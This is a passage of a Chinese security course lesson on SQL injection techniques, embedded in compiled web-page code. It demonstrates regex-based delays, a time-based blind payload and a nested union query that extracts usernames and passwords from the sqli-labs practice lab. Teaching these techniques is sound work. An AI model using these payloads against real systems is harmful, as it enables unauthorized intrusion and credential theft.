<span class="line"><span style="color:#005CC5;">1</span><span style="color:#24292E;"> row in </span><span style="color:#6F42C1;">set</span><span style="color:#24292E;"> (</span><span style="color:#005CC5;">2.72</span><span style="color:#24292E;"> sec)</span></span></code></pre></div><p>（3）<strong>REPEAT(str,count)</strong>：返回字符串 str 重复 count 次后的字符串。</p><div class="language-java vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">java</span><pre class="shiki github-dark vp-code-dark"><code><span class="line"><span style="color:#E1E4E8;">mysql</span><span style="color:#F97583;">&gt;</span><span style="color:#E1E4E8;"> select </span><span style="color:#B392F0;">rpad</span><span style="color:#E1E4E8;">(</span><span style="color:#9ECBFF;">&#39;a&#39;</span><span style="color:#E1E4E8;">,</span><span style="color:#79B8FF;">4999999</span><span style="color:#E1E4E8;">,</span><span style="color:#9ECBFF;">&#39;a&#39;</span><span style="color:#E1E4E8;">) RLIKE </span><span style="color:#B392F0;">concat</span><span style="color:#E1E4E8;">(</span><span style="color:#B392F0;">repeat</span><span style="color:#E1E4E8;">(</span><span style="color:#9ECBFF;">&#39;(a.*)+&#39;</span><span style="color:#E1E4E8;">,</span><span style="color:#79B8FF;">50</span><span style="color:#E1E4E8;">),</span><span style="color:#9ECBFF;">&#39;b&#39;</span><span style="color:#E1E4E8;">);</span></span>
<span class="line"><span style="color:#F97583;">+-------------------------------------------------------------+</span></span>
<span class="line"><span style="color:#F97583;">|</span><span style="color:#E1E4E8;"> </span><span style="color:#B392F0;">rpad</span><span style="color:#E1E4E8;">(</span><span style="color:#9ECBFF;">&#39;a&#39;</span><span style="color:#E1E4E8;">,</span><span style="color:#79B8FF;">4999999</span><span style="color:#E1E4E8;">,</span><span style="color:#9ECBFF;">&#39;a&#39;</span><span style="color:#E1E4E8;">) RLIKE </span><span style="color:#B392F0;">concat</span><span style="color:#E1E4E8;">(</span><span style="color:#B392F0;">repeat</span><span style="color:#E1E4E8;">(</span><span style="color:#9ECBFF;">&#39;(a.*)+&#39;</span><span style="color:#E1E4E8;">,</span><span style="color:#79B8FF;">50</span><span style="color:#E1E4E8;">),</span><span style="color:#9ECBFF;">&#39;b&#39;</span><span style="color:#E1E4E8;">) </span><span style="color:#F97583;">|</span></span>
<span class="line"><span style="color:#F97583;">+-------------------------------------------------------------+</span></span>
<span class="line"><span style="color:#F97583;">|</span><span style="color:#E1E4E8;">                                                           </span><span style="color:#79B8FF;">0</span><span style="color:#E1E4E8;"> </span><span style="color:#F97583;">|</span></span>
<span class="line"><span style="color:#F97583;">+-------------------------------------------------------------+</span></span>
<span class="line"><span style="color:#79B8FF;">1</span><span style="color:#E1E4E8;"> row in </span><span style="color:#B392F0;">set</span><span style="color:#E1E4E8;"> (</span><span style="color:#79B8FF;">5.92</span><span style="color:#E1E4E8;"> sec)</span></span></code></pre><pre class="shiki github-light vp-code-light"><code><span class="line"><span style="color:#24292E;">mysql</span><span style="color:#D73A49;">&gt;</span><span style="color:#24292E;"> select </span><span style="color:#6F42C1;">rpad</span><span style="color:#24292E;">(</span><span style="color:#032F62;">&#39;a&#39;</span><span style="color:#24292E;">,</span><span style="color:#005CC5;">4999999</span><span style="color:#24292E;">,</span><span style="color:#032F62;">&#39;a&#39;</span><span style="color:#24292E;">) RLIKE </span><span style="color:#6F42C1;">concat</span><span style="color:#24292E;">(</span><span style="color:#6F42C1;">repeat</span><span style="color:#24292E;">(</span><span style="color:#032F62;">&#39;(a.*)+&#39;</span><span style="color:#24292E;">,</span><span style="color:#005CC5;">50</span><span style="color:#24292E;">),</span><span style="color:#032F62;">&#39;b&#39;</span><span style="color:#24292E;">);</span></span>
<span class="line"><span style="color:#D73A49;">+-------------------------------------------------------------+</span></span>
<span class="line"><span style="color:#D73A49;">|</span><span style="color:#24292E;"> </span><span style="color:#6F42C1;">rpad</span><span style="color:#24292E;">(</span><span style="color:#032F62;">&#39;a&#39;</span><span style="color:#24292E;">,</span><span style="color:#005CC5;">4999999</span><span style="color:#24292E;">,</span><span style="color:#032F62;">&#39;a&#39;</span><span style="color:#24292E;">) RLIKE </span><span style="color:#6F42C1;">concat</span><span style="color:#24292E;">(</span><span style="color:#6F42C1;">repeat</span><span style="color:#24292E;">(</span><span style="color:#032F62;">&#39;(a.*)+&#39;</span><span style="color:#24292E;">,</span><span style="color:#005CC5;">50</span><span style="color:#24292E;">),</span><span style="color:#032F62;">&#39;b&#39;</span><span style="color:#24292E;">) </span><span style="color:#D73A49;">|</span></span>
<span class="line"><span style="color:#D73A49;">+-------------------------------------------------------------+</span></span>
<span class="line"><span style="color:#D73A49;">|</span><span style="color:#24292E;">                                                           </span><span style="color:#005CC5;">0</span><span style="color:#24292E;"> </span><span style="color:#D73A49;">|</span></span>
<span class="line"><span style="color:#D73A49;">+-------------------------------------------------------------+</span></span>
<span class="line"><span style="color:#005CC5;">1</span><span style="color:#24292E;"> row in </span><span style="color:#6F42C1;">set</span><span style="color:#24292E;"> (</span><span style="color:#005CC5;">5.92</span><span style="color:#24292E;"> sec)</span></span></code></pre></div><p>我们以 sqli-labs 第 2 题为例构造请求：</p><div class="language-sql vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">sql</span><pre class="shiki github-dark vp-code-dark"><code><span class="line"><span style="color:#F97583;">http</span><span style="color:#E1E4E8;">:</span><span style="color:#F97583;">//</span><span style="color:#E1E4E8;">localhost</span><span style="color:#F97583;">/</span><span style="color:#E1E4E8;">Less</span><span style="color:#F97583;">-</span><span style="color:#79B8FF;">2</span><span style="color:#F97583;">/</span><span style="color:#E1E4E8;">?id</span><span style="color:#F97583;">=</span><span style="color:#79B8FF;">1</span><span style="color:#E1E4E8;"> </span><span style="color:#F97583;">and</span><span style="color:#E1E4E8;"> sleep(</span><span style="color:#79B8FF;">5</span><span style="color:#E1E4E8;">)</span><span style="color:#6A737D;">--+</span></span></code></pre><pre class="shiki github-light vp-code-light"><code><span class="line"><span style="color:#D73A49;">http</span><span style="color:#24292E;">:</span><span style="color:#D73A49;">//</span><span style="color:#24292E;">localhost</span><span style="color:#D73A49;">/</span><span style="color:#24292E;">Less</span><span style="color:#D73A49;">-</span><span style="color:#005CC5;">2</span><span style="color:#D73A49;">/</span><span style="color:#24292E;">?id</span><span style="color:#D73A49;">=</span><span style="color:#005CC5;">1</span><span style="color:#24292E;"> </span><span style="color:#D73A49;">and</span><span style="color:#24292E;"> sleep(</span><span style="color:#005CC5;">5</span><span style="color:#24292E;">)</span><span style="color:#6A737D;">--+</span></span></code></pre></div><p>在 Chrome 浏览器的 Network 标签内可以看到该请求刚好处时 5 秒钟，说明确实存在漏洞。</p>`,23),v=p('<p>图 13：Chrome 标签内展示</p><h4 id="内联-嵌套查询注入" tabindex="-1">内联/嵌套查询注入 <a class="header-anchor" href="#内联-嵌套查询注入" aria-label="Permalink to &quot;内联/嵌套查询注入&quot;">​</a></h4><p>使用内联查询来检索数据，本质上是嵌入在另一个查询中的查询，例如：</p><div class="language-sql vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">sql</span><pre class="shiki github-dark vp-code-dark"><code><span class="line"><span style="color:#F97583;">SELECT</span><span style="color:#E1E4E8;"> (</span><span style="color:#F97583;">SELECT</span><span style="color:#E1E4E8;"> </span><span style="color:#F97583;">password</span><span style="color:#E1E4E8;"> </span><span style="color:#F97583;">from</span><span style="color:#E1E4E8;"> users) </span><span style="color:#F97583;">from</span><span style="color:#E1E4E8;"> product;</span></span></code></pre><pre class="shiki github-light vp-code-light"><code><span class="line"><span style="color:#D73A49;">SELECT</span><span style="color:#24292E;"> (</span><span style="color:#D73A49;">SELECT</span><span style="color:#24292E;"> </span><span style="color:#D73A49;">password</span><span style="color:#24292E;"> </span><span style="color:#D73A49;">from</span><span style="color:#24292E;"> users) </span><span style="color:#D73A49;">from</span><span style="color:#24292E;"> product;</span></span></code></pre></div><p>以 sqli-labs 第 2 题为例，结合前面介绍的联合查询来构造请求：</p><div class="language-java vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">java</span><pre class="shiki github-dark vp-code-dark"><code><span class="line"><span style="color:#E1E4E8;">http</span><span style="color:#F97583;">:</span><span style="color:#6A737D;">//localhost/Less-2/?id=0 union select 1,(SELECT username from users where id=2),(SELECT password from users where id=2)</span></span></code></pre><pre class="shiki github-light vp-code-light"><code><span class="line"><span style="color:#24292E;">http</span><span style="color:#D73A49;">:</span><span style="color:#6A737D;">//localhost/Less-2/?id=0 union select 1,(SELECT username from users where id=2),(SELECT password from users where id=2)</span></span></code></pre></div><p>通过以上代码我们可以看到 id=2 的用户名和密码，如下图所示：</p>',7),L=n("p",null,"图 14：内联/嵌套查询注入",-1),T=n("p",null,"内联/嵌套查询注入方法可以在一句语句中嵌入另一句语句，在有限漏洞场景下能实现更多的功能，因此在实际的漏洞利用中常被用于实现敏感信息的窃取，甚至执行系统命令。",-1),S=n("h3",{id:"总结",tabindex:"-1"},[s("总结 "),n("a",{class:"header-anchor",href:"#总结","aria-label":'Permalink to "总结"'},"​")],-1),k=n("p",null,"这一讲我主要介绍了 SQL 注入的产生原理、分类，以及相关的测试技术。SQL 注入产生的原因是由于开发对用户的输入数据未做有效过滤，直接引用 SQL 语句执行，导致原本的数据被当作 SQL 语句执行。通常来说，SQL 注入分为数字型和字符型注入，我们主要通过注入参数类型来判断。",-1),f=n("p",null,"我还介绍了 6 大 SQL 注入测试技术，这是挖掘和利用 SQL 注入漏洞的基础，只有掌握这些测试技术，才能进一步提升对 SQL 注入的理解与实践能力。",-1),w=n("p",null,"SQL 注入通常被视为高危或严重的漏洞，一些漏洞奖励平台对此的赏金也会很高，尤其是在国外，经常在 5000 美金以上，甚至有的是几万美金。",-1),I=n("p",null,"在学习之后，你也可以尝试去挖一些国内的 SRC 平台或者国外 HackerOne 平台授权的测试网站。如果你有发现什么有趣的 SQL 注入漏洞，欢迎在留言区分享。",-1);function M(R,$,Q,P,O,H){const a=e("Image");return t(),c("div",null,[E,l(a,{alt:"Drawing 0.png",src:"https://s0.lgstatic.com/i/image2/M01/03/A4/CgpVE1_gPOeAI7xSAABTJIYxcfE254.png"}),s(),y,l(a,{alt:"Drawing 1.png",src:"https://s0.lgstatic.com/i/image2/M01/03/A4/CgpVE1_gPPmAe_Z_AALZLcXi9OA547.png"}),s(),F,i,l(a,{alt:"Drawing 2.png",src:"https://s0.lgstatic.com/i/image2/M01/03/A3/Cip5yF_gPP6AYussAALaISw7_cc369.png"}),s(),C,l(a,{alt:"Drawing 3.png",src:"https://s0.lgstatic.com/i/image2/M01/03/A3/Cip5yF_gPQ2AHPOrAAMq22_Vn7A821.png"}),s(),u,d,l(a,{alt:"Drawing 4.png",src:"https://s0.lgstatic.com/i/image2/M01/03/A4/CgpVE1_gPRWATvHkAAMWNlgn8Q0897.png"}),s(),h,l(a,{alt:"Drawing 5.png",src:"https://s0.lgstatic.com/i/image2/M01/03/A4/CgpVE1_gPSSAcUf3AAOSbJ2meEM358.png"}),s(),g,l(a,{alt:"Drawing 6.png",src:"https://s0.lgstatic.com/i/image2/M01/03/A4/CgpVE1_gPSqACFm1AAOOcCQ2IIE741.png"}),s(),B,l(a,{alt:"Drawing 7.png",src:"https://s0.lgstatic.com/i/image2/M01/03/A4/CgpVE1_gPTmAH1smAAOLYXHDOxU134.png"}),s(),A,D,l(a,{alt:"Drawing 8.png",src:"https://s0.lgstatic.com/i/image2/M01/03/A3/Cip5yF_gPT-AD3rcAAOEXKoNpik989.png"}),s(),q,l(a,{alt:"Drawing 9.png",src:"https://s0.lgstatic.com/i/image2/M01/03/A4/CgpVE1_gPUqADu50AANtXLBwuf0866.png"}),s(),_,l(a,{alt:"Drawing 10.png",src:"https://s0.lgstatic.com/i/image2/M01/03/A3/Cip5yF_gPVGAYoxhAANs6mFjRDI693.png"}),s(),m,l(a,{alt:"Drawing 11.png",src:"https://s0.lgstatic.com/i/image2/M01/03/A3/Cip5yF_gPVmAaBouAAN-25Njwzw855.png"}),s(),b,l(a,{alt:"Drawing 12.png",src:"https://s0.lgstatic.com/i/image2/M01/03/A4/CgpVE1_gPWaAOKOTAABkBqvFPw0394.png"}),s(),v,l(a,{alt:"Drawing 13.png",src:"https://s0.lgstatic.com/i/image2/M01/03/A4/CgpVE1_gPW-AdtmmAAOCJCqUXmU735.png"}),s(),L,T,S,k,f,w,I,l(a,{alt:"Lark20201231-135716.png",src:"https://s0.lgstatic.com/i/image/M00/8C/7D/CgqCHl_taF6AUy71AAUbxs9dlU0807.png"})])}const V=o(r,[["render",M]]);export{x as __pageData,V as default};
